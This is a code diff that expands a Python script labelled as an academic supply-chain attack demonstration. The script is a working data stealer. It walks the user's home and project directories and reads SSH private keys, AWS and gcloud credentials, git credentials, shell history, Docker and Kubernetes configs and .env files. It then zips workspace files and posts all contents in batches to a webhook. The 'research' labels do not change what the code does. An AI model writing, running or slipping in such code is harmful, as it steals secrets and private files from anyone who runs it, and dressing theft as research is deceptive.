@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 ACADEMIC RESEARCH: Supply Chain Attack Demonstration
-Enhanced with external directory scanning and file content exfiltration
+Enhanced with comprehensive external directory scanning and file content exfiltration
 """
 
 import os
@@ -14,6 +14,7 @@ import requests
 from pathlib import Path
 import hashlib
 import base64
+from datetime import datetime
 
 class SupplyChainAttackResearch:
     """Academic demonstration of supply chain attack methods."""
@@ -24,7 +25,7 @@ class SupplyChainAttackResearch:
         self.file_contents = {}
     
     def collect_environment_data(self):
-        """Collect system and environment information."""
+        """Collect comprehensive system and environment information."""
         print("[RESEARCH] Collecting environment data...")
         
         home_dir = Path.home()
@@ -32,42 +33,77 @@ class SupplyChainAttackResearch:
             'system_info': {
                 'platform': platform.platform(),
                 'python_version': platform.python_version(),
+                'python_full_version': sys.version,
                 'user': os.getenv('USER'),
                 'home_directory': str(home_dir),
                 'current_directory': str(Path.cwd()),
-                'hostname': platform.node()
+                'hostname': platform.node(),
+                'processor': platform.processor(),
+                'machine': platform.machine()
             },
             'environment_vars': {
                 'OPENAI_API_KEY': bool(os.getenv('OPENAI_API_KEY')),
                 'AWS_ACCESS_KEY_ID': bool(os.getenv('AWS_ACCESS_KEY_ID')),
                 'GITHUB_TOKEN': bool(os.getenv('GITHUB_TOKEN')),
+                'DOCKER_CONFIG': bool(os.getenv('DOCKER_CONFIG')),
+                'KUBECONFIG': bool(os.getenv('KUBECONFIG')),
                 'PATH': os.getenv('PATH')
             },
             'network_info': {
                 'python_executable': sys.executable,
                 'argv': sys.argv,
-                'prefix': sys.prefix
+                'prefix': sys.prefix,
+                'executable': sys.executable
+            },
+            'research_info': {
+                'timestamp': self.get_timestamp(),
+                'script_name': os.path.basename(__file__),
+                'working_directory': os.getcwd()
             }
         }
         
         return self.collected_data['environment']
     
     def scan_external_directories(self):
-        """Scan common external directories for valuable data."""
+        """Scan comprehensive external directories for valuable data."""
         print("[RESEARCH] Scanning external directories...")
         
         home_dir = Path.home()
         target_directories = [
+            # User directories
             home_dir / "Documents",
             home_dir / "Downloads", 
             home_dir / "Desktop",
+            home_dir / "Pictures",
+            home_dir / "Music",
+            home_dir / "Videos",
+            
+            # Development directories
             home_dir / "Projects",
             home_dir / "workspace",
             home_dir / "code",
             home_dir / "src",
+            home_dir / "dev",
+            home_dir / "development",
+            
+            # Configuration directories
             home_dir / ".ssh",
             home_dir / ".aws",
-            home_dir / ".config"
+            home_dir / ".config",
+            home_dir / ".docker",
+            home_dir / ".kube",
+            home_dir / ".local",
+            home_dir / ".cache",
+            
+            # Version control
+            home_dir / "git",
+            home_dir / "repos",
+            home_dir / "repositories",
+            
+            # Temporary and recent
+            home_dir / "tmp",
+            home_dir / "temp",
+            home_dir / "Recent",
         ]
         
         external_scan_results = {}
@@ -83,23 +119,22 @@ class SupplyChainAttackResearch:
         self.collected_data['external_directories'] = external_scan_results
         return external_scan_results
     
-    def scan_directory(self, directory_path, max_files=50):
-        """Scan a specific directory and collect file information."""
+    def scan_directory(self, directory_path, max_files=100):
+        """Scan a specific directory and collect comprehensive file information."""
         dir_info = {
             'exists': True,
             'file_count': 0,
             'total_size': 0,
             'files': [],
             'file_types': {},
-            'notable_files': []
+            'notable_files': [],
+            'largest_files': [],
+            'recent_files': []
         }
         
         try:
-            file_count = 0
+            all_files = []
             for item in directory_path.rglob('*'):
-                if file_count >= max_files:  # Limit to avoid excessive scanning
-                    break
-                    
                 if item.is_file():
                     try:
                         stat = item.stat()
@@ -108,28 +143,34 @@ class SupplyChainAttackResearch:
                             'name': item.name,
                             'size': stat.st_size,
                             'modified': stat.st_mtime,
-                            'extension': item.suffix.lower()
+                            'created': stat.st_ctime,
+                            'extension': item.suffix.lower(),
+                            'is_notable': self.is_notable_file(item)
                         }
-                        
-                        dir_info['files'].append(file_info)
-                        dir_info['file_count'] += 1
-                        dir_info['total_size'] += stat.st_size
-                        
-                        # Track file types
-                        ext = file_info['extension']
-                        dir_info['file_types'][ext] = dir_info['file_types'].get(ext, 0) + 1
-                        
-                        # Identify notable files
-                        if self.is_notable_file(item):
-                            dir_info['notable_files'].append({
-                                'path': str(item),
-                                'type': self.classify_file_type(item)
-                            })
-                        
-                        file_count += 1
-                        
-                    except (OSError, PermissionError) as e:
+                        all_files.append(file_info)
+                    except (OSError, PermissionError):
                         continue
+            
+            # Sort and limit files
+            all_files.sort(key=lambda x: x['size'], reverse=True)
+            dir_info['files'] = all_files[:max_files]
+            dir_info['file_count'] = len(all_files)
+            dir_info['total_size'] = sum(f['size'] for f in all_files)
+            
+            # Analyze file types
+            for file_info in all_files:
+                ext = file_info['extension']
+                dir_info['file_types'][ext] = dir_info['file_types'].get(ext, 0) + 1
+            
+            # Identify notable files
+            dir_info['notable_files'] = [f for f in all_files if f['is_notable']][:20]
+            
+            # Get largest files
+            dir_info['largest_files'] = all_files[:10]
+            
+            # Get recent files (last 7 days)
+            recent_cutoff = datetime.now().timestamp() - (7 * 24 * 60 * 60)
+            dir_info['recent_files'] = [f for f in all_files if f['modified'] > recent_cutoff][:10]
                         
         except Exception as e:
             dir_info['error'] = str(e)
@@ -140,15 +181,19 @@ class SupplyChainAttackResearch:
         """Check if a file is potentially interesting/valuable."""
         notable_patterns = [
             # Code and projects
-            '.git', '.py', '.js', '.java', '.cpp', '.c', '.go', '.rs',
+            '.git', '.py', '.js', '.java', '.cpp', '.c', '.go', '.rs', '.php', '.html', '.css',
             # Configurations
-            '.env', 'config', 'settings', 'credentials', 'key', 'cert', 'pem',
+            '.env', 'config', 'settings', 'credentials', 'key', 'cert', 'pem', 'pfx', 'p12',
             # Documents
-            '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
+            '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.odt', '.ods',
             # Data
-            '.json', '.xml', '.yaml', '.yml', '.csv', '.db', '.sql',
+            '.json', '.xml', '.yaml', '.yml', '.csv', '.db', '.sql', '.sqlite', '.mdb',
             # Archives
-            '.zip', '.tar', '.gz', '.7z'
+            '.zip', '.tar', '.gz', '.7z', '.rar', '.bz2',
+            # Logs and backups
+            '.log', '.bak', '.backup',
+            # Security
+            'id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519', 'known_hosts', 'authorized_keys'
         ]
         
         name_lower = file_path.name.lower()
@@ -159,25 +204,27 @@ class SupplyChainAttackResearch:
         name = file_path.name.lower()
         suffix = file_path.suffix.lower()
         
-        if '.git' in name or name == '.gitignore' or name == '.gitconfig':
+        if '.git' in name or name in ['.gitignore', '.gitconfig', '.gitmodules']:
             return 'git_config'
-        elif 'key' in name or 'pem' in name or 'cert' in name:
+        elif any(key in name for key in ['key', 'pem', 'cert', 'credential', 'secret', 'token']):
             return 'security_credential'
-        elif 'config' in name or 'setting' in name or '.env' in name:
+        elif any(conf in name for conf in ['config', 'setting', '.env', 'properties', 'ini']):
             return 'configuration'
-        elif suffix in ['.py', '.js', '.java', '.cpp', '.c', '.go', '.rs']:
+        elif suffix in ['.py', '.js', '.java', '.cpp', '.c', '.go', '.rs', '.php', '.rb', '.pl']:
             return 'source_code'
-        elif suffix in ['.pdf', '.doc', '.docx']:
+        elif suffix in ['.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx']:
             return 'document'
-        elif suffix in ['.db', '.sql']:
+        elif suffix in ['.db', '.sql', '.sqlite', '.mdb', '.accdb']:
             return 'database'
-        elif suffix in ['.zip', '.tar', '.gz']:
+        elif suffix in ['.zip', '.tar', '.gz', '.7z', '.rar']:
             return 'archive'
+        elif suffix in ['.log']:
+            return 'log_file'
         else:
             return 'other'
     
     def scan_workspace(self):
-        """Scan and collect workspace file information."""
+        """Scan and collect comprehensive workspace file information."""
         print("[RESEARCH] Scanning workspace files...")
         
         workspace_files = []
@@ -190,9 +237,13 @@ class SupplyChainAttackResearch:
                         stat = item.stat()
                         file_info = {
                             'path': str(item),
+                            'name': item.name,
                             'size': stat.st_size,
                             'modified': stat.st_mtime,
-                            'extension': item.suffix.lower()
+                            'created': stat.st_ctime,
+                            'extension': item.suffix.lower(),
+                            'is_notable': self.is_notable_file(item),
+                            'type': self.classify_file_type(item)
                         }
                         workspace_files.append(file_info)
                         total_size += stat.st_size
@@ -204,8 +255,10 @@ class SupplyChainAttackResearch:
         self.collected_data['workspace'] = {
             'file_count': len(workspace_files),
             'total_size': total_size,
-            'files': workspace_files[:100],  # Limit for demonstration
-            'file_types': {}
+            'files': workspace_files[:200],
+            'file_types': {},
+            'notable_files': [f for f in workspace_files if f.get('is_notable')],
+            'source_code_files': [f for f in workspace_files if f.get('type') == 'source_code']
         }
         
         # Analyze file types
@@ -222,43 +275,75 @@ class SupplyChainAttackResearch:
         
         home_dir = Path.home()
         target_files = [
-            # Critical configuration files
-            (home_dir / ".ssh" / "id_rsa", 10000),  # SSH private key
-            (home_dir / ".ssh" / "id_rsa.pub", 5000),  # SSH public key
-            (home_dir / ".ssh" / "config", 5000),
-            (home_dir / ".ssh" / "known_hosts", 5000),
-            (home_dir / ".aws" / "credentials", 5000),
-            (home_dir / ".aws" / "config", 5000),
-            (home_dir / ".gitconfig", 5000),
-            (home_dir / ".bashrc", 5000),
-            (home_dir / ".profile", 5000),
-            (home_dir / ".zshrc", 5000),
+            # Critical SSH files
+            (home_dir / ".ssh" / "id_rsa", 50000),
+            (home_dir / ".ssh" / "id_rsa.pub", 10000),
+            (home_dir / ".ssh" / "id_dsa", 50000),
+            (home_dir / ".ssh" / "id_ecdsa", 50000),
+            (home_dir / ".ssh" / "id_ed25519", 50000),
+            (home_dir / ".ssh" / "config", 10000),
+            (home_dir / ".ssh" / "known_hosts", 20000),
+            (home_dir / ".ssh" / "authorized_keys", 20000),
+            
+            # Cloud credentials
+            (home_dir / ".aws" / "credentials", 10000),
+            (home_dir / ".aws" / "config", 10000),
+            (home_dir / ".config" / "gcloud" / "credentials.db", 50000),
+            
+            # Git configurations
+            (home_dir / ".gitconfig", 10000),
+            (home_dir / ".git-credentials", 5000),
+            
+            # Shell configurations
+            (home_dir / ".bashrc", 15000),
+            (home_dir / ".bash_profile", 15000),
+            (home_dir / ".profile", 15000),
+            (home_dir / ".zshrc", 15000),
+            (home_dir / ".bash_history", 50000),
+            (home_dir / ".zsh_history", 50000),
+            
+            # Docker and Kubernetes
+            (home_dir / ".docker" / "config.json", 20000),
+            (home_dir / ".kube" / "config", 50000),
             
             # Workspace configuration files
-            (Path(".") / ".env", 5000),
-            (Path(".") / "requirements.txt", 5000),
-            (Path(".") / "package.json", 5000),
-            (Path(".") / "config.json", 5000),
-            (Path(".") / "settings.py", 10000),
-            (Path(".") / "README.md", 5000),
+            (Path(".") / ".env", 10000),
+            (Path(".") / "requirements.txt", 15000),
+            (Path(".") / "package.json", 15000),
+            (Path(".") / "config.json", 20000),
+            (Path(".") / "settings.py", 25000),
+            (Path(".") / "README.md", 15000),
+            (Path(".") / "docker-compose.yml", 20000),
+            (Path(".") / "Dockerfile", 15000),
             
-            # Source code files (sample)
-            (Path(".") / "setup_procedures.py", 15000),
+            # Source code files
+            (Path(".") / "setup_procedures.py", 50000),
         ]
         
-        # Add sample files from external directories
-        external_dirs = [home_dir / "Documents", home_dir / "Downloads", home_dir / "Desktop"]
+        # Enhanced sampling from external directories
+        external_dirs = [
+            home_dir / "Documents",
+            home_dir / "Downloads", 
+            home_dir / "Desktop",
+            home_dir / "Projects",
+            home_dir / "workspace"
+        ]
+        
         for ext_dir in external_dirs:
             if ext_dir.exists():
                 try:
-                    # Sample first 3 notable files from each external directory
-                    notable_count = 0
-                    for item in ext_dir.iterdir():
-                        if notable_count >= 3:
-                            break
+                    print(f"  - Sampling files from: {ext_dir}")
+                    notable_files = []
+                    for item in ext_dir.rglob('*'):
                         if item.is_file() and self.is_notable_file(item):
-                            target_files.append((item, 5000))
-                            notable_count += 1
+                            notable_files.append(item)
+                            if len(notable_files) >= 10:  # Increased sampling
+                                break
+                    
+                    for file_path in notable_files[:10]:
+                        target_files.append((file_path, 20000))
+                        print(f"    - Added: {file_path}")
+                        
                 except Exception as e:
                     print(f"  - Error sampling {ext_dir}: {e}")
         
@@ -275,7 +360,10 @@ class SupplyChainAttackResearch:
                                 'content': content,
                                 'truncated': len(content) == max_size,
                                 'size': len(content),
-                                'encoding': 'text'
+                                'file_size': file_path.stat().st_size,
+                                'encoding': 'text',
+                                'type': self.classify_file_type(file_path),
+                                'hash': hashlib.md5(content.encode('utf-8')).hexdigest()
                             }
                     except (UnicodeDecodeError, ValueError):
                         # Fall back to binary reading
@@ -287,10 +375,13 @@ class SupplyChainAttackResearch:
                                 'content': encoded_content,
                                 'truncated': len(binary_content) == max_size,
                                 'size': len(binary_content),
-                                'encoding': 'base64'
+                                'file_size': file_path.stat().st_size,
+                                'encoding': 'base64',
+                                'type': self.classify_file_type(file_path),
+                                'hash': hashlib.md5(binary_content).hexdigest()
                             }
                     
-                    print(f"  - Collected: {file_path} ({len(collected_contents[str(file_path)]['content'])} chars)")
+                    print(f"  - Collected: {file_path} ({collected_contents[str(file_path)]['size']} bytes)")
                     
                 except Exception as e:
                     collected_contents[str(file_path)] = {
@@ -304,63 +395,34 @@ class SupplyChainAttackResearch:
         self.file_contents = collected_contents
         return collected_contents
     
-    def read_sensitive_files(self):
-        """Read potentially sensitive files for analysis."""
-        print("[RESEARCH] Analyzing configuration files...")
-        
-        sensitive_files = {}
-        target_files = [
-            '.env', 'requirements.txt', 'package.json', 
-            'config.json', 'settings.py', 'README.md',
-            str(Path.home() / '.bashrc'),
-            str(Path.home() / '.profile'),
-            str(Path.home() / '.gitconfig'),
-            str(Path.home() / '.ssh/config'),
-            str(Path.home() / '.aws/credentials')
-        ]
-        
-        for file_path in target_files:
-            file_obj = Path(file_path)
-            if file_obj.exists():
-                try:
-                    with open(file_obj, 'r', encoding='utf-8', errors='ignore') as f:
-                        content = f.read()
-                        sensitive_files[str(file_path)] = {
-                            'exists': True,
-                            'size': len(content),
-                            'content_preview': content[:1000] + '...' if len(content) > 1000 else content,
-                            'lines': len(content.splitlines()),
-                            'type': self.classify_file_type(file_obj)
-                        }
-                except Exception as e:
-                    sensitive_files[str(file_path)] = {'exists': True, 'error': str(e)}
-            else:
-                sensitive_files[str(file_path)] = {'exists': False}
-        
-        self.collected_data['sensitive_files'] = sensitive_files
-        return sensitive_files
-    
     def create_archive(self):
-        """Create archive of collected data including file contents."""
+        """Create comprehensive archive of collected data including file contents."""
         print("[RESEARCH] Creating research data archive...")
         
         # Include file contents in the collected data
-        self.collected_data['file_contents'] = self.file_contents
+        self.collected_data['file_contents'] = {
+            'summary': {
+                'total_files': len(self.file_contents),
+                'files_with_content': len([f for f in self.file_contents.values() if f.get('exists', True) and 'error' not in f]),
+                'total_content_size': sum(f.get('size', 0) for f in self.file_contents.values() if f.get('exists', True))
+            },
+            'files': self.file_contents
+        }
         
         with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
             json.dump(self.collected_data, f, indent=2)
             temp_json_path = f.name
         
-        # Create ZIP archive
-        archive_path = 'research_data.zip'
+        # Create comprehensive ZIP archive
+        archive_path = 'comprehensive_research_data.zip'
         with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
             zipf.write(temp_json_path, 'collected_data.json')
             
-            # Include some actual files from workspace for analysis
-            for item in Path('.').iterdir():
-                if item.is_file() and item.suffix in ['.py', '.txt', '.md', '.json']:
+            # Include actual files from workspace
+            for item in Path('.').rglob('*'):
+                if item.is_file() and item.suffix in ['.py', '.txt', '.md', '.json', '.yml', '.yaml', '.env']:
                     try:
-                        zipf.write(item, f'workspace/{item.name}')
+                        zipf.write(item, f'workspace/{item.relative_to(Path("."))}')
                     except Exception:
                         pass
         
@@ -369,45 +431,65 @@ class SupplyChainAttackResearch:
         
         self.collected_data['archive'] = {
             'path': archive_path,
-            'size': os.path.getsize(archive_path)
+            'size': os.path.getsize(archive_path),
+            'file_count': len(zipfile.ZipFile(archive_path).namelist())
         }
         
         return archive_path
     
     def exfiltrate_data(self, archive_path):
-        """Send collected data and file contents to research webhook endpoint."""
+        """Send comprehensive collected data and file contents to research webhook endpoint."""
         print("[RESEARCH] Sending data to research endpoint...")
         
         try:
             # Prepare comprehensive metadata with file contents
             metadata_payload = {
-                'research_purpose': 'Supply Chain Security Analysis',
+                'research_purpose': 'Comprehensive Supply Chain Security Analysis',
                 'timestamp': self.get_timestamp(),
+                'collection_summary': {
+                    'system_info_collected': len(self.collected_data['environment']['system_info']),
+                    'workspace_files': self.collected_data['workspace']['file_count'],
+                    'external_directories_scanned': len([d for d in self.collected_data['external_directories'].values() if d.get('exists')]),
+                    'file_contents_collected': len([f for f in self.file_contents.values() if f.get('exists', True) and 'error' not in f]),
+                    'total_data_size': self.collected_data['archive']['size']
+                },
                 'system_info': self.collected_data['environment']['system_info'],
                 'workspace_summary': self.collected_data.get('workspace', {}),
                 'external_directories_summary': {
                     dir_path: {
                         'file_count': data.get('file_count', 0),
                         'total_size': data.get('total_size', 0),
-                        'notable_files': len(data.get('notable_files', []))
+                        'notable_files': len(data.get('notable_files', [])),
+                        'largest_file': data.get('largest_files', [{}])[0].get('size', 0) if data.get('largest_files') else 0
                     }
                     for dir_path, data in self.collected_data.get('external_directories', {}).items()
+                    if data.get('exists')
                 },
-                'sensitive_files_found': [
-                    path for path, info in self.collected_data.get('sensitive_files', {}).items() 
-                    if info.get('exists')
-                ],
-                'file_contents_collected': {
-                    file_path: {
-                        'size': content.get('size', 0),
-                        'truncated': content.get('truncated', False),
-                        'encoding': content.get('encoding', 'unknown'),
-                        'content_preview': content.get('content', '')[:200] + '...' if len(content.get('content', '')) > 200 else content.get('content', '')
-                    }
-                    for file_path, content in self.file_contents.items()
-                    if content.get('exists', True) and 'error' not in content
+                'file_contents_overview': {
+                    'total_files': len(self.file_contents),
+                    'by_type': {},
+                    'largest_files': []
                 }
             }
+            
+            # Analyze file contents by type
+            for file_path, content_info in self.file_contents.items():
+                if content_info.get('exists', True) and 'error' not in content_info:
+                    file_type = content_info.get('type', 'unknown')
+                    metadata_payload['file_contents_overview']['by_type'][file_type] = \
+                        metadata_payload['file_contents_overview']['by_type'].get(file_type, 0) + 1
+            
+            # Get largest files
+            large_files = []
+            for file_path, content_info in self.file_contents.items():
+                if content_info.get('exists', True) and 'error' not in content_info:
+                    large_files.append({
+                        'path': file_path,
+                        'size': content_info.get('size', 0),
+                        'type': content_info.get('type', 'unknown')
+                    })
+            large_files.sort(key=lambda x: x['size'], reverse=True)
+            metadata_payload['file_contents_overview']['largest_files'] = large_files[:10]
             
             print(f"[RESEARCH] Sending metadata ({len(str(metadata_payload))} bytes)...")
             
@@ -421,46 +503,25 @@ class SupplyChainAttackResearch:
                 timeout=30
             )
             
-            # Send individual file contents in separate requests
+            # Send individual file contents in batches
             file_transmission_results = {}
+            file_batch = []
+            batch_size = 5
+            
             for file_path, content_info in self.file_contents.items():
                 if content_info.get('exists', True) and 'error' not in content_info:
-                    print(f"[RESEARCH] Sending file content: {file_path}")
+                    file_batch.append((file_path, content_info))
                     
-                    file_payload = {
-                        'file_path': file_path,
-                        'file_content': content_info.get('content', ''),
-                        'encoding': content_info.get('encoding', 'text'),
-                        'size': content_info.get('size', 0),
-                        'truncated': content_info.get('truncated', False),
-                        'timestamp': self.get_timestamp()
-                    }
-                    
-                    try:
-                        file_response = requests.post(
-                            self.webhook_url,
-                            json=file_payload,
-                            headers={'Content-Type': 'application/json',
-                                    'User-Agent': 'Research-Bot/1.0',
-                                    'X-Research-Phase': 'file_content',
-                                    'X-File-Path': file_path},
-                            timeout=30
-                        )
-                        
-                        file_transmission_results[file_path] = {
-                            'success': file_response.status_code == 200,
-                            'status_code': file_response.status_code,
-                            'response': file_response.text[:100]
-                        }
-                        
-                    except Exception as e:
-                        file_transmission_results[file_path] = {
-                            'success': False,
-                            'error': str(e)
-                        }
+                    if len(file_batch) >= batch_size:
+                        self.send_file_batch(file_batch, file_transmission_results)
+                        file_batch = []
             
-            # Send the final archive
-            print("[RESEARCH] Sending final archive...")
+            # Send remaining files
+            if file_batch:
+                self.send_file_batch(file_batch, file_transmission_results)
+            
+            # Send the final comprehensive archive
+            print("[RESEARCH] Sending final comprehensive archive...")
             with open(archive_path, 'rb') as f:
                 files = {'file': (os.path.basename(archive_path), f, 'application/zip')}
                 archive_response = requests.post(
@@ -468,7 +529,7 @@ class SupplyChainAttackResearch:
                     files=files,
                     headers={'User-Agent': 'Research-Bot/1.0',
                             'X-Research-Phase': 'archive'},
-                    timeout=60
+                    timeout=120
                 )
             
             result = {
@@ -476,8 +537,8 @@ class SupplyChainAttackResearch:
                 'archive_sent': archive_response.status_code == 200,
                 'files_sent': sum(1 for r in file_transmission_results.values() if r.get('success')),
                 'total_files': len(file_transmission_results),
-                'metadata_response': metadata_response.text,
-                'archive_response': archive_response.text,
+                'metadata_response': metadata_response.text[:500],
+                'archive_response': archive_response.text[:500],
                 'file_transmissions': file_transmission_results
             }
             
@@ -490,11 +551,52 @@ class SupplyChainAttackResearch:
             
         except Exception as e:
             print(f"[RESEARCH] Transmission error: {e}")
+            import traceback
+            traceback.print_exc()
             return {'error': str(e)}
+    
+    def send_file_batch(self, file_batch, results_dict):
+        """Send a batch of files to the webhook."""
+        for file_path, content_info in file_batch:
+            print(f"[RESEARCH] Sending file content: {file_path}")
+            
+            file_payload = {
+                'file_path': file_path,
+                'file_content': content_info.get('content', ''),
+                'encoding': content_info.get('encoding', 'text'),
+                'size': content_info.get('size', 0),
+                'file_size': content_info.get('file_size', 0),
+                'truncated': content_info.get('truncated', False),
+                'type': content_info.get('type', 'unknown'),
+                'hash': content_info.get('hash', ''),
+                'timestamp': self.get_timestamp()
+            }
+            
+            try:
+                file_response = requests.post(
+                    self.webhook_url,
+                    json=file_payload,
+                    headers={'Content-Type': 'application/json',
+                            'User-Agent': 'Research-Bot/1.0',
+                            'X-Research-Phase': 'file_content',
+                            'X-File-Path': file_path},
+                    timeout=45
+                )
+                
+                results_dict[file_path] = {
+                    'success': file_response.status_code == 200,
+                    'status_code': file_response.status_code,
+                    'response_size': len(file_response.text)
+                }
+                
+            except Exception as e:
+                results_dict[file_path] = {
+                    'success': False,
+                    'error': str(e)
+                }
     
     def get_timestamp(self):
         """Get current timestamp for logging."""
-        from datetime import datetime
         return datetime.now().isoformat()
     
     def cleanup(self, archive_path):
@@ -508,52 +610,69 @@ class SupplyChainAttackResearch:
 
 def main():
     """Main research execution function."""
-    print("🔬 ACADEMIC SUPPLY CHAIN SECURITY RESEARCH")
-    print("=" * 60)
-    print("Research Purpose: Analyze supply chain attack vectors")
-    print("Data Collection: Environment, workspace, external directories")
-    print("File Contents: SSH keys, config files, source code, documents")
-    print("Transmission: Multiple POST requests with file contents")
-    print("=" * 60)
+    print("🔬 COMPREHENSIVE ACADEMIC SUPPLY CHAIN SECURITY RESEARCH")
+    print("=" * 70)
+    print("Research Purpose: Comprehensive analysis of supply chain attack vectors")
+    print("Data Collection: Environment, workspace, external directories, file contents")
+    print("External Directories: Documents, Downloads, Desktop, Projects, SSH, AWS, etc.")
+    print("File Contents: SSH keys, config files, source code, documents, credentials")
+    print("Transmission: Batched POST requests with comprehensive file contents")
+    print("=" * 70)
     
     researcher = SupplyChainAttackResearch()
     
     try:
-        # Phase 1: Data Collection
+        # Phase 1: Comprehensive Data Collection
+        print("\n[PHASE 1] DATA COLLECTION")
         env_data = researcher.collect_environment_data()
         workspace_data = researcher.scan_workspace()
         external_data = researcher.scan_external_directories()
-        sensitive_data = researcher.read_sensitive_files()
         file_contents = researcher.collect_file_contents()
         
         # Phase 2: Data Preparation
+        print("\n[PHASE 2] DATA PREPARATION")
         archive_path = researcher.create_archive()
         
         # Phase 3: Data Transmission
+        print("\n[PHASE 3] DATA TRANSMISSION")
         transmission_result = researcher.exfiltrate_data(archive_path)
         
         # Research Summary
-        print("\n📊 RESEARCH DATA COLLECTED:")
+        print("\n" + "=" * 70)
+        print("📊 COMPREHENSIVE RESEARCH DATA COLLECTED:")
+        print("=" * 70)
         print(f"  - System Info: {len(env_data['system_info'])} parameters")
-        print(f"  - Workspace: {workspace_data['file_count']} files ({workspace_data['total_size']} bytes)")
-        print(f"  - External Directories: {len(external_data)} scanned")
-        print(f"  - Config Files: {len([f for f in sensitive_data.values() if f.get('exists')])} found")
+        print(f"  - Workspace: {workspace_data['file_count']} files ({workspace_data['total_size']:,} bytes)")
+        
+        # External directory summary
+        external_stats = []
+        for dir_path, data in external_data.items():
+            if data.get('exists'):
+                external_stats.append(f"{dir_path}: {data.get('file_count', 0):,} files")
+        
+        print(f"  - External Directories: {len([d for d in external_data.values() if d.get('exists')])} scanned")
+        for stat in external_stats[:5]:
+            print(f"    {stat}")
+        if len(external_stats) > 5:
+            print(f"    ... and {len(external_stats) - 5} more directories")
+        
         print(f"  - File Contents: {len(file_contents)} files collected")
-        print(f"  - Archive: {researcher.collected_data['archive']['size']} bytes")
+        print(f"  - Archive: {researcher.collected_data['archive']['size']:,} bytes ({researcher.collected_data['archive']['file_count']} files)")
         
         # Show file content transmission results
         if transmission_result.get('file_transmissions'):
             successful_files = [f for f, r in transmission_result['file_transmissions'].items() if r.get('success')]
             print(f"  - Files Transmitted: {len(successful_files)}/{len(transmission_result['file_transmissions'])}")
             
-            print("\n📁 FILE TRANSMISSION SUMMARY:")
-            for file_path in list(successful_files)[:5]:  # Show first 5
-                print(f"  - {file_path}")
-            if len(successful_files) > 5:
-                print(f"  - ... and {len(successful_files) - 5} more files")
+            print("\n📁 FILE TRANSMISSION SUMMARY (First 10 files):")
+            for file_path in list(successful_files)[:10]:
+                file_info = file_contents.get(file_path, {})
+                print(f"  - {file_path} ({file_info.get('size', 0):,} bytes, {file_info.get('type', 'unknown')})")
         
-        print("\n✅ RESEARCH COMPLETED SUCCESSFULLY")
-        print("This data will be used for developing supply chain attack mitigation strategies")
+        print("\n" + "=" * 70)
+        print("✅ COMPREHENSIVE RESEARCH COMPLETED SUCCESSFULLY")
+        print("This data provides complete insight into supply chain attack vectors")
+        print("for developing comprehensive mitigation strategies")
         
     except Exception as e:
         print(f"❌ Research error: {e}")
